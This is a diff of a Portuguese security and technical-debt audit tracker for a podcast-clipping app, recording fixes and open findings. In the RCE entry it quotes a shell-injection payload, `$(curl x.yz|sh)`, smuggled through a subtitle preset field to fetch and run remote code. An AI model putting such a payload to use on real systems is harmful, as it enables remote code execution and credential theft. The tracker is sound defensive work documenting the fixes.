@@ -43,6 +43,11 @@ Estes itens **devem** ser corrigidos antes de qualquer release para produção.
   **Origem:** domain-specialist  
   **Resolvido:** `PrismaUnitOfWork.execute()` agora abre a transação via `db.$transaction(async (tx) => ...)` e popula `dbTransactionContext` (o mesmo `AsyncLocalStorage` já usado por `tests/helpers/with-rollback-transaction.ts`) com `{ tx }` via `dbTransactionContext.run({ tx }, operation)`, envolvendo a chamada de `operation()`. Isso redireciona automaticamente qualquer `db.*` chamado pelos repositórios dentro da unidade de trabalho para a transação real, sem alterar a interface pública `IUnitOfWork.execute<T>(operation: () => Promise<T>): Promise<T>` nem os call sites dos use cases. TDD: novo teste de integração `tests/integration/prisma-unit-of-work-atomicity.integration.test.ts` prova o bug (vermelho: saldo do usuário ficava debitado mesmo com a 2ª escrita — registro de `CreditTransaction` — falhando de propósito) e a correção (verde: rollback real, saldo intocado). Deliberadamente **não** usa o padrão de transação+rollback de isolamento de testes (`with-rollback-transaction.ts`): rodar dentro dele mascararia o bug, pois o mecanismo de `SAVEPOINT` do Proxy em `db.ts` já garante atomicidade por si só quando há uma transação de teste ativa, independente do código de produção estar correto. Suíte completa validada contra banco Postgres novo (`prisma migrate deploy` + `vitest run`): 84/84 testes de integração relevantes passando (12 falhas pré-existentes de `health-check.test.ts`/`legal-pages.test.ts` são de ambiente — dependem de servidor Next já rodando — e já documentadas no item "Chave Clerk" em HIGH → Infraestrutura, não relacionadas a esta mudança), `tests/integration/credit-service.test.ts` (testes de concorrência) 7/7, `npm run test` (unitários, com `InMemoryUnitOfWork`) 605 passed | 8 skipped, `npm run check` (lint + typecheck) sem erros.
 
+- [x] **Cobrança divergente do modo de processamento (cortes manuais cobrados como automáticos)** — Mesma classe do BLOCKER de cortes manuais: o hold de crédito lia `event.data.mode`, enquanto o payload enviado ao GPU derivava `mode` da presença de cortes (`buildProcessVideoPayload`). Com cortes e `mode` omitido/`"auto"`, o usuário pagava 1 crédito pelo preço automático e o GPU processava até 50 clipes manuais.  
+  **Evidência:** `ai-podcast-clipper-frontend/src/inngest/functions.ts` (guards em ~linhas 216-234, antes de `makeHoldCreditsUseCase`), `src/domain/errors/manual-cuts-mode-mismatch-error.ts`  
+  **Origem:** auditoria de segurança pós-correção de cortes manuais (2026-10-09)  
+  **Resolvido (2026-10-09):** `ManualCutsModeMismatchError` rejeita a requisição antes da reserva quando há cortes e `mode !== "manual"`. Decisão de produto confirmada pelo usuário: rejeitar, não cobrar como manual. Testes: `tests/unit/inngest/manual-cuts-billing-consistency.test.ts` (unit, `mode` omitido e `'auto'`) e `tests/integration/manual-cuts-billing-consistency.integration.test.ts` (nenhuma reserva de crédito, GPU não chamado, arquivo marcado como `failed`). Regra: RN-PIPE-MANUAL-15.
+
 ### Segurança
 
 - [x] **Next.js 15.3.2 com CVEs críticas não patcheadas** — `npm audit` reporta 2 critical (RCE no protocolo React Flight, exposição de código-fonte de Server Actions), 5 high, 22 moderate. App usa intensamente App Router + Server Actions (superfície de ataque direta).  
@@ -54,6 +59,16 @@ Estes itens **devem** ser corrigidos antes de qualquer release para produção.
   **Evidência:** `./aws-s3-lifecycle-rules.md:15-19`, `ai-podcast-clipper-backend/main.py:232-233`, `generate-upload-url.use-case.ts:20`, `import-youtube-video.use-case.ts:27`  
   **Origem:** security-specialist, devops-specialist  
   **Resolvido:** Pipeline backend consolidado em módulos compartilhados (`core/`), incluindo `s3_paths.py` que garante clipes finais gravados em `clips/` (em vez da mesma pasta do vídeo original). TDD: teste vermelho → implementação → verde.
+
+- [x] **RCE via `preset` em `subprocess.run(..., shell=True)` — execução de comando no container de GPU — RESOLVIDO (2026-10-09)** — `core/subtitles.py` montava o comando ffmpeg de legendas como string com o campo `preset` controlado pelo usuário e executava com `shell=True`. O único controle era um limite de 50 caracteres. Um preset como `"$(curl x.yz|sh)"` executaria comando arbitrário no container, que tem credenciais AWS, `GEMINI_API_KEY` e `AUTH_TOKEN`.  
+  **Evidência:** `ai-podcast-clipper-backend/core/subtitles.py` (ffmpeg via lista de argumentos, `subprocess.run(ffmpeg_cmd, shell=False, check=True)`), `core/schemas.py` (`SubtitlePreset` e `SUBTITLE_PRESETS`, `ProcessVideoRequest.preset`), `ai-podcast-clipper-frontend/src/domain/schemas/process-video.schema.ts` e `import-youtube-video.schema.ts` (`z.enum(PROJECT_SUBTITLE_PRESETS)`)  
+  **Origem:** auditoria de segurança pós-correção de cortes manuais (2026-10-09)  
+  **Resolvido:** `shell=False` elimina a classe de vulnerabilidade no caminho de legendas, independente de allowlist. Além disso, `preset` aceita só 12 valores (os 11 da UI, incluindo `NONE`, mais o alias legado `CLEAN`) e qualquer outro gera 422 antes do pipeline. Testes: `ai-podcast-clipper-backend/tests/test_preset_shell_injection.py` (allowlist, default HORMOZI, ffmpeg chamado sem shell), `tests/test_local_server.py::test_shell_metachar_preset_returns_422_before_pipeline`, `tests/test_subtitles.py`; frontend `tests/unit/domain/schemas/process-video.schema.test.ts` e `import-youtube-video.schema.test.ts`. Regra: RN-PIPE-PRESET-01 e RNF-SEC-16. **Pendências desta rodada** (5 outros `shell=True` e gaps de `NONE` e de dados legados) listadas abaixo, em "Pendências abertas da auditoria de segurança (2026-10-09)".
+
+- [x] **Entrada de corte manual aceitava `NaN`/`Infinity` e título sem limite no backend** — `end=NaN` passava por todas as validações de `ManualCut`, porque o JSON do Python aceita esses literais. O frontend já limitava o título a 200 caracteres; o backend não limitava.  
+  **Evidência:** `ai-podcast-clipper-backend/core/schemas.py` (`ConfigDict(extra="forbid", allow_inf_nan=False)`, `MAX_MANUAL_CUT_TITLE_LENGTH = 200`, `Field(max_length=...)`)  
+  **Origem:** auditoria de segurança pós-correção de cortes manuais (2026-10-09)  
+  **Resolvido (2026-10-09):** teste `ai-podcast-clipper-backend/tests/test_manual_cut_input_hardening.py` (NaN/Infinity em `start`/`end`, inclusive via JSON bruto; título acima de 200 → 422; título no limite aceito). Regra: RN-PIPE-MANUAL-04.
 
 ### Infraestrutura e Deploy
 
@@ -145,10 +160,17 @@ Estes itens foram identificados por 5 especialistas durante revisão técnica do
 
 ### Riscos Confirmados de Implementação (Gap Funcional)
 
-- **(BLOCKER — Funcionalidade Anunciada Não Funciona)** Confirmado por 3 revisores independentes (2026-10-04): O backend Python (`core/schemas.py::ProcessVideoRequest`) só aceita `s3_key` e `preset` — os campos `mode`, `manual_cuts`, `aspect_ratio`, `auto_zoom`, `genre` enviados pelo frontend (cortes manuais por timestamp, opções dinâmicas de vídeo) **são descartados silenciosamente** pelo Pydantic v2. O backend sempre roda o pipeline automático completo (detecção de momentos via IA), ignorando qualquer configuração manual do usuário — e ainda gasta uma chamada à API do Gemini desnecessariamente. 
-  - **Arquivo**: `ai-podcast-clipper-backend/core/schemas.py`, `src/inngest/functions.ts:278-282`
-  - **Severidade**: BLOCKER (funcionalidade anunciada não entrega no backend)
-  - **Requer decisão**: Implementar a recepção desses campos no backend, ou remover/avisar sobre a limitação no frontend.
+- [x] **(BLOCKER — Funcionalidade Anunciada Não Funciona) RESOLVIDO (2026-10-09) para cortes manuais.** Confirmado por 3 revisores independentes (2026-10-04): o backend Python (`core/schemas.py::ProcessVideoRequest`) só aceitava `s3_key` e `preset` — `mode`, `manual_cuts`, `aspect_ratio`, `auto_zoom`, `genre` **eram descartados silenciosamente** pelo Pydantic v2, e o backend sempre rodava o pipeline automático (com chamada ao Gemini), ignorando os cortes do usuário. O frontend também derivava `mode` de `clipModel`, que é opção de layout.
+  - **Severidade original**: BLOCKER (funcionalidade anunciada não entregava no backend).
+  - **Resolvido**: contrato `POST /process_video` v2, spec em `../historico/superpowers/specs/2026-10-09-manual-cuts-process-video-contract-v2-spec.md`.
+    - Backend: `ProcessVideoRequest` com `extra="forbid"` (campo desconhecido → 422), `mode` `auto`/`manual`, `ManualCut` (≤ 60s, ≤ 50 cortes) em `core/schemas.py`; `core/video_probe.py` (novo) valida a duração real via ffprobe (corte além do fim do vídeo → 422); `core/video_pipeline.py::run_video_processing_pipeline(request)` é o único ponto de bifurcação e pula Gemini no modo manual.
+    - Frontend: `src/application/services/process-video-payload.service.ts` deriva `mode` de cortes presentes (não de `clipModel`); `src/application/use-cases/retry-project.use-case.ts` usa `manualCutsJson`; `src/domain/errors/manual-cuts-required-error.ts` impede reserva de crédito com `mode="manual"` sem cortes.
+    - Evidência (execução em 2026-10-09): backend `pytest` 130 passed; frontend `npm run test` 617 passed | 8 skipped. Testes por regra em `requisitos-funcionais-e-nao-funcionais.md` (RF-PIPE-08) e `casos-de-uso-e-regras-de-negocio.md` (RN-PIPE-MANUAL-01 a 14).
+  - **Gaps conhecidos (abertos, exigem decisão)**:
+    - `aspect_ratio`, `auto_zoom` e `genre` são aceitos pelo schema mas **sem efeito funcional** (decisão D1; RN-PIPE-MANUAL-12). Vira RF futuro.
+    - **Novo (2026-10-09):** `mode: "auto"` enviado junto com `manualCuts` passa pelos schemas Zod (`src/domain/schemas/process-video.schema.ts`, `src/domain/schemas/import-youtube-video.schema.ts`). Nesse caso o hold cobra o preço automático (usa `event.data.mode`), mas `buildProcessVideoPayload` envia `mode: "manual"` ao backend, que processa os cortes. **Mitigado (2026-10-09):** o guard `ManualCutsModeMismatchError` em `src/inngest/functions.ts` rejeita a combinação antes do hold (RN-PIPE-MANUAL-15; testes em `tests/unit/inngest/manual-cuts-billing-consistency.test.ts`). Falta apenas rejeitar na borda (Zod), o que é melhoria, não bloqueio.
+    - **Novo (2026-10-09):** a importação do YouTube com cortes (`src/application/use-cases/videos/import-youtube-video.use-case.ts`) não grava `manualCutsJson`. Como o retry deriva o modo dessa coluna (D6), reprocessar esse projeto roda em modo automático e perde os cortes.
+    - **Novo (2026-10-09):** o handler de 422 por duração real em `main.py` (Modal) não tem teste direto; `tests/test_main_process_video.py` só cobre o encaminhamento do request ao pipeline compartilhado.
 
 ### Riscos Não Confirmados (Suspeitas que Requerem Teste Real)
 
@@ -187,6 +209,28 @@ Estes itens foram identificados por 5 especialistas durante revisão técnica do
 
 - **(HIGH, Reforça Item Existente)** Endpoint de debug `/api/dev-sign-stripe-payload` ainda acessível fora de produção (middleware não cobre `/api`), permite forjar webhooks Stripe válidos. O próprio código já o marca como "TEMPORÁRIO" — ação recomendada é REMOVER diretamente, não é mais uma decisão em aberto.
   - **Arquivo**: `src/app/api/dev-sign-stripe-payload/route.ts`
+
+### Pendências abertas da auditoria de segurança (2026-10-09)
+
+Encontradas na auditoria que fechou o RCE via `preset` (acima). Não foram corrigidas nesta rodada.
+
+- [ ] **(MÉDIA — funcional) Preset `NONE` ("Sem Legenda") não tem implementação no backend** — o usuário escolhe "Sem Legenda" (`ai-podcast-clipper-frontend/src/components/dashboard/create-project-client.tsx:540`) e o contrato aceita `NONE` (`ai-podcast-clipper-backend/core/schemas.py`), mas `core/subtitle_styles.py::SUPPORTED_PRESETS` não o contém. `get_preset_style` imprime um aviso e cai para HORMOZI, então o clipe sai com legenda HORMOZI.  
+  **Ação:** tratar `NONE` como "sem queima de legenda" no pipeline (`core/subtitles.py`, `core/clip_pipeline.py`) e cobrir com teste que confirme a ausência de legenda no resultado.  
+  **Origem:** auditoria de segurança (2026-10-09), ao validar a allowlist de `preset`.
+
+- [ ] **(MÉDIA — funcional) Projetos antigos com `subtitlePreset` fora da allowlist recebem 422 no retry** — antes desta correção, a validação só limitava o tamanho do preset (50 caracteres). Um projeto salvo com valor fora da lista chega ao `src/application/use-cases/retry-project.use-case.ts` (`preset: updated.subtitlePreset || "HORMOZI"`) e o backend responde 422.  
+  **Ação:** decidir entre (a) normalizar ou migrar os dados legados no banco ou (b) fallback explícito no retry com log; cobrir com teste.  
+  **Origem:** auditoria de segurança (2026-10-09).
+
+- [x] **Cinco outras chamadas `subprocess.run(..., shell=True)` com string montada no backend — AUDITADO (2026-10-09), sem ação necessária** — `core/clip_pipeline.py:73` e `:79`, `core/vertical_video.py:144`, `core/transcription.py:61`, `core/active_speaker_detection.py:43`. Auditoria lendo o código de cada ponto e de seus chamadores: todas interpolam apenas valores internos ao pipeline — caminhos gerados com `uuid4` (`/tmp/<uuid>`, `input.mp4`, `clip_{index}`, `audio.wav`), índice inteiro, `start`/`end` como `float` validados pelo Pydantic (`ClipItem`/`ManualCut`) e configuração do operador (`asd_dir`). Nenhuma recebe dado do usuário sem sanitização. `s3_key` não entra em nenhum comando de shell.  
+  **Ressalva:** migrar para lista de argumentos com `shell=False` continua sendo defesa em profundidade válida no futuro, mas não é urgente.  
+  **Fora do escopo:** `ai-podcast-clipper-backend/asd/` (clone externo, ver `AGENTS.md`) também usa `shell=True`.  
+  **Origem:** auditoria de segurança (2026-10-09).
+
+- [ ] **(BAIXA — a verificar) `s3_key` aceita caminho local no backend** — `core/video_pipeline.py::resolve_input_video_path` faz `os.path.exists(s3_key)` e, se existir, `shutil.copy(s3_key, ...)`; só caso contrário baixa do S3. Ou seja, um `s3_key` que seja caminho de arquivo do container é copiado para o pipeline. Não é injeção de shell (o valor não entra em comando), mas é leitura de arquivo arbitrário do container se um chamador autenticado controlar `s3_key`. **Pendente:** verificar se o frontend ou algum fluxo permite ao usuário definir `s3_key` livremente (hoje não verificado) e, se não for necessário para desenvolvimento local, restringir o fallback de caminho local a um diretório permitido ou removê-lo.  
+  **Origem:** leitura do código durante a auditoria do `shell=True` (2026-10-09).
+
+- **Atualizado em 2026-10-09:** comparação do Bearer token não constant-time (RNF-SEC-07) foi corrigida; ver o item resolvido em HIGH → Infraestrutura.
 
 ---
 
@@ -237,7 +281,9 @@ Estes itens impactam segurança, confiabilidade ou experiência crítica; recome
 
 - [ ] **Bucket S3 hardcoded divergente entre front e backend** — Backend: `"ai-podcast-clipper"` (`ai-podcast-clipper-backend/main.py:314,468`); Frontend: `S3_BUCKET_NAME` — inconsistência.
 
-- [ ] **Auth do endpoint Modal com comparação não constant-time** — `ai-podcast-clipper-backend/main.py:453,521` usa `==` simples; usar `hmac.compare_digest`.
+- [x] **Auth do endpoint Modal com comparação não constant-time — RESOLVIDO (2026-10-09)** — RNF-SEC-07. `main.py::process_video` e `main.py::download_youtube` (e `local_server.py::verify_auth_token`) comparavam o bearer com `!=` (timing side-channel). Agora usam `hmac.compare_digest` sobre bytes (`.encode("utf-8")`); `AUTH_TOKEN` ausente/vazio ou bearer vazio → 401 explícito. Bearer não-ASCII → 401 (guarda contra regressão: `compare_digest` com `str` não-ASCII lança `TypeError`).  
+  **Nota sobre o impacto:** `!=` em strings não é constant-time (o vazamento por tempo é a razão da correção; não foi medido um ataque real). O caso de `AUTH_TOKEN` vazio não era alcançável pela rede, porque o `HTTPBearer` do FastAPI já rejeita bearer vazio com 401.  
+  **Evidência:** `ai-podcast-clipper-backend/tests/test_auth_token_constant_time.py` (15 passed: 5 cenários × 3 pontos de entrada, com espião em `hmac.compare_digest`). Suíte backend completa `.venv/bin/python -m pytest`: 192 passed.
 
 - [ ] **Observabilidade sem exportação externa** — Stack OpenTelemetry só local; sem alertas reais (Slack, email, PagerDuty).
 
